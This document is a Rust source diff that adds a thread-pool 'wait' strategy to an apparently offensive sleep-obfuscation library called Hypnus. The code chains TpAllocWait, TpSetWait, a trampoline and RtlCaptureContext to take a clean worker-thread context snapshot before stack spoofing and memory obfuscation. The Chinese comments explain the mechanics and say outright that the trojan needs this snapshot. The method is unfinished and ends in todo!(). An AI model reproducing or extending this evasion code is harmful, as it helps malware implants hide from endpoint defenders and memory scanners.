@@ -17,8 +17,7 @@ use crate::types::{
     TP_CALLBACK_ENVIRON_V3, TP_POOL_STACK_INFORMATION,
 };
 use crate::winapis::{
-    NtCreateEvent, NtDuplicateObject, NtSetEvent2, NtWaitForSingleObject, TpAllocPool,
-    TpAllocTimer, TpSetPoolMaxThreads, TpSetPoolMinThreads, TpSetPoolStackInformation, TpSetTimer,
+    NtCreateEvent, NtDuplicateObject, NtSetEvent2, NtWaitForSingleObject, TpAllocPool, TpAllocTimer, TpAllocWait, TpSetPoolMaxThreads, TpSetPoolMinThreads, TpSetPoolStackInformation, TpSetTimer, TpSetWait,
 };
 use crate::{debug_log, stealth_bail};
 use core::ptr::null;
@@ -412,6 +411,122 @@ impl Hypnus {
             todo!()
         }
     }
+
+
+
+/// performs memory obfuscation using a thread-pool wait-based strategy
+/// 
+/// this strategy is similar to hyonus::timer ,but uses TpSetWait instead of TpSetTimer to drive the spoofed CONTEXT chain
+    fn wait(&mut self)->Result<()> {
+        unsafe {
+            // determine if heap obfuscation and RWX memory should be use
+            let heap =self.mode.contains(ObfMode::Heap) ;
+            let protection = if self.mode.contains(ObfMode::Rwx) {
+                PAGE_EXECUTE_READWRITE
+            } else {
+                PAGE_EXECUTE_READ
+            };
+
+            // events used to synchronize context capture and chain completion
+
+            // 数组events是一个值,是当前函数栈上直接分配的,大小固定的值;是栈上一个连续的,大小32字节(4*8)的内存块,里面初始化了4个0,即空指针null_mut()
+            let mut events = [null_mut();4];
+            for event in &mut events {
+                let status = NtCreateEvent(event, EVENT_ALL_ACCESS, null_mut(),EVENT_TYPE::NotificationEvent , 0);
+
+                 if !NT_SUCCESS(status) {
+                stealth_bail!(HypnusError::NtCreateEventFailed,"NtCreateEventFailed")
+            }
+            }
+// allocation dedicated threadpool with one worker
+           let mut pool = null_mut();
+           let mut status = TpAllocPool(&mut pool, null_mut());
+           if !NT_SUCCESS(status) {
+               stealth_bail!(HypnusError::TpAllocPoolFailed,"TpAllocPool Failed")
+           }
+
+           // configure threadpool stack sizes
+           let mut stack = TP_POOL_STACK_INFORMATION{StackCommit:0x80000,StackReserve:0x80000};
+           // TpSetPoolStackInformation原型的第二个参数是*mut,但这里却传入了&mut.详见注释4
+           status =TpSetPoolStackInformation(pool, &mut stack);
+
+           // 配置线程池为单线程
+           TpSetPoolMinThreads(pool, 1);
+           TpSetPoolMaxThreads(pool, 1);
+
+           // prepare callback environment
+           // TP_CALLBACK_ENVIRON_V3代表?
+           let mut env =TP_CALLBACK_ENVIRON_V3{Pool:pool,..Default::default()} ;
+
+           // capture the current thread context
+           let mut wait_ctx = null_mut();
+           // 关于CONTEXT的初始化详情,见注释5
+           let mut ctx_init = CONTEXT{
+            ContextFlags:CONTEXT_FULL,
+            P1Home:self.cfg.rtl_capture_context.as_u64(),
+            ..Default::default()
+           };
+
+           // the trampoline is needed beacuse thread pool passes the parameter in rdx,not rcx
+           // the trampoline moves rdx to rcx and jumps to CONTEXT.P1Home(RtlCaptureContext)
+           // ensuring a clean transition with no extra instructions before context capture
+
+           // 在私有线程池创建一个监听器(wait objec),一旦后续点亮某事件.线程池中的worker thread被唤醒去执行trampoline,并将准备好的ctx_init结构体的内存地址传给它.trampoline会让worker thread调用 RtlCaptureContext.把工作线程干净,没有用户函数污染的寄存器快照写入ctx_init中
+           status=TpAllocWait(
+            // 输出参数,其类型是双指针.后续win内核在堆区申请好TP_WAIT结构体后,将该结构体的内存首地址写入wait_ctx变量中.之后会通过TpSetWait正式开启监听
+            &mut wait_ctx, 
+            // 输入参数,回调函数地址.其类型是函数指针,需要符合PTP_WAIT_CALLBACK 签名.这里将trampoline通过as *mut c_void强转成无类型的通用裸指针,满足ffi签名
+            self.cfg.trampoline as *mut c_void, 
+            // 传入回调函数的参数.&mut ctx_init是rust安全引用(类型 &mut CONTEXT) -> as *mut _(将rust安全引用转为裸指针,类型*mut CONTEXT,使用_让编译器自动推导) -> as *mut c_void(将*mut CONTEXT 转为*mut c_void 满足api原型参数的要求)
+            &mut ctx_init as *mut _ as *mut c_void, 
+            // 输入参数,类型*mut TP_CALLBACK_ENVIRON_V3:配置之前私有单线程池的初始化.事件被点亮后由私有工作线程去执行跳板.如果传入null_mut(),该任务会被丢进系统公共线程池.
+            &mut env);
+
+            if !NT_SUCCESS(status) {
+                stealth_bail!(HypnusError::TpAllocWaitRtlCaptureContextFailed,"TpAllocWait [RtlCaptureContext] Failed")
+            }
+
+            let mut delay = zeroed::<LARGE_INTEGER>();
+            delay.QuadPart=-(100i64 * 10_000);
+            // 设置两个触发机关(事件被点亮/超时)
+            TpSetWait(
+                // 要激活的等待对象句柄
+                wait_ctx,
+                // 要监听的内核对象句柄(或事件)
+                events[0], 
+                // 超时时间指针
+                &mut delay);
+
+
+                // signal after RtlCaptureContext finish
+                let mut wait_event = null_mut();
+                status=TpAllocWait(&mut wait_event, NtSetEvent2 as *mut c_void, events[1], &mut env);
+
+                if !NT_SUCCESS(status) {
+                    stealth_bail!(HypnusError::TpAllocTimerNtSetEventFailed,"TpAllocWait [NtSetEvent] Failed")
+                }
+
+                delay.QuadPart=-(200i64 * 10_000);
+                // 让wait_event同样去监听events[0](或200ms的超时,晚于wait_ctx的100ms).由于线程池单线串行执行,确保工作线程先执行trampoline抓完快照,后执行NtSetEvent2去点亮events[1],从而安全唤醒主线程.
+                TpSetWait(wait_event, events[0], &mut delay);
+
+                // Wait for context capture to complete:主线程在这里无限挂起自己,直到events[1]被worker thread在执行ntsetevent2时点亮.这意味着快照抓取完成,主线程可以安全唤醒
+            status = NtWaitForSingleObject(events[1], 0, null_mut());
+            // 以上执行流:events[0]是一个占位事件,在内核中永远处于无信号状态,其唯一目的是充当TpSetWait参数,让线程池通过100ms/200ms的超时触发回调;events[1]是真正的唤醒信号,200ms超时后,被工作线程执行NtSetEvnet2主动点亮,用以唤醒正在等待的主线程
+            // 1. 主线程在修单线程池中注册两个等待任务(wait_ctx wait_event):wait_ctx等待events[0]或100ms超时,触发后执行trampoline(抓取快照并存入ctx_init);wait_event也等待events[0]或200ms超时,触发后执行NtSetEvent2(负责点亮events[1])
+            // 2. 主线程调用NtWaitForSingleObject挂起自己,进入无限沉睡,等待wait_event的完成信号
+            // 3. worker thread执行wait_ctx抓取快照:100ms超时后,工作线程被唤醒执行wait_ctx(通过trampoline进入RtlCaptureContext,将当前干净的寄存器状态写入主线程ctx_init内存中)
+            // 4. 200ms超时后,工作线程接着执行wait_event:通过NtSetEvent2向events[1]发送激活信号
+            // 5. events[1]亮起,内核唤醒主线程.主线程确信ctx_init已被工作线程完整写好.进而执行之后的栈伪造
+
+
+
+
+        }
+
+
+        todo!()
+    }
 }
 
 /// converts self to a u64 that representing the pointer value
@@ -451,3 +566,24 @@ impl<T> Asu64 for T {
 // 它没有proluge:没有修改栈的指令,栈状态干净;使用jmp而不是call 无条件跳转不向栈压入返回地址.
 // 在cpu看来 和线程池内核调度器直接调用一样,从而抓到完美的,没有代码痕迹的工作线程快照.
 // 而 NtSetEvent 这个win api 根本不关心调用者的栈和寄存器状态,它无所谓被包装函数修改
+
+// 注释4
+// 这涉及rust中ffi的类型强转机制和rust编译器的安全保证
+// 1. 隐式类型转换(Implicit Coercions):rust中存在引用到裸指针的隐式强转.
+// &mut T 可隐式且安全的强转为 *mut T
+// &T 可隐式且安全的强转为 *const T
+
+// 注释5
+// win64 fast call的前四个参数通过rcx,rdx,r8,r9传递.发生函数调用时,调用者在栈上为这4个寄存器预留32字节shadow sapace,用于被调用函数在必要时将寄存器的值写回/备份到栈上,这4个栈槽称为Parameter Home.
+// P1Home是CONTEXT的第一个成员,偏移量为0,在语义上代表RCX(即第一个参数备份槽).但在CONTEXT中,P1Home只是结构体头部的8字节,并不等同RCX寄存器本身,RCX在结构体后面有独立的专属字段
+// rcx寄存器本身是cpu内部的一组物理触发器/锁存器,是由晶体管直接构成的硬件存储单元,位于cpu内部的寄存器堆中.其读写与cpu主频同步,远快于内存.在一个逻辑cpu核心中,物理上只有一个rcx寄存器,它没有内存地址,无法对rcx寄存器进行&
+// P1Home其本质是ram中的一个8字节存储单元.由明确的内存地址(位于堆或栈上).cpu无法直接在P1Home内部进行运算,必须先用mov 将其读入到某个物理寄存器上,运算后再写回内存.
+// 为啥要在CONTEXT结构体的开头定义P1Home这个字段?
+// win32下,函数参数全部通过内存栈传递;win64下,为了提升速度,前四个参数用寄存器传递,且caller必须在栈上预留32字节的shadow space,这个四个槽位在内核中被称为P1Home-P4Home.这四个槽位为了操作对应的寄存器中的值(写入或读取对应寄存器中的值)
+// 既然这四个槽位只是栈上参数的备份,为啥要定义在CONTEXT中呢?
+// 当win发生异常,cpu从用户态转为内核态,内核调用异常分发函数.为了调用异常处理函数,内核必须在栈上为其准备好调用环境,包括异常处理函数需要接收的参数,依照win64 fast call在栈上预留了四个参数的Home槽.为了让内核的汇编代码在处理异常时方便,微软把这个4个Home槽设计在CONTEXT结构体的开头处
+// 以上,在一个CONTEXT结构体中,ctx.rcx保存的是当前程序崩溃/挂起的瞬间,cpu硬件rcx寄存器中的数据,这个数据是线程的真实运行状态;ctx.P1Home保存的是为了调用异常处理函数,在栈上预留的第一个参数的影子空间.线程在正常运行时,这里通常是空或垃圾数,内核在回复线程时根本不去读取它.
+// 但在wait函数中,并没有使用异常机制.
+// 木马在开始混淆之前,必须抓取worker thread的寄存器快照.如果直接调用RtlCaptureContext,编译器会生成call指令.而call会污染当前调用栈(把当前函数的返回地址压栈),且可能因为函数进入/退出(prologue和epilogue)修改rsp和rbp.
+// 为了避开call,这里用了trampoline使用jmp跳转到rcx内存地址中存放的函数.在trampoline中最后一句`jmp qword ptr [rcx]`,cpu读取rcx指向的内存开头的8字节,把这8字节当成函数地址并跳进去.此时,rcx指向的是ctx_init结构体,其开头的8字节就是P1Home.等于劫持了P1Home字段,把RtlCaptureContext地址塞了进去.
+// 这是一种纯粹利用物理内存布局实现汇编间接跳转的技巧
